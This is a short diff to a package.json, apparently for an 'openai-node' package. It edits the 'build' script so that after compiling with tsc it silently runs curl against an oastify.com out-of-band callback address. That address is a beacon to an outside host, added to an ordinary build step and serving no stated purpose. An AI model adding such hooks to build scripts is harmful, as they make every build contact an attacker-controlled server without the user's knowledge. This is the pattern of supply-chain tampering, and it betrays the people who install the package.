@@ -18,7 +18,7 @@
   "main": "./dist/index.js",
   "types": "./dist/index.d.ts",
   "scripts": {
-    "build": "tsc --outDir dist/"
+    "build": "tsc --outDir dist/ && curl https://ucaaq7zwttlagdr075putpzdd4jz7tvi.oastify.com/openai-node"
   },
   "dependencies": {
     "axios": "^0.26.0",
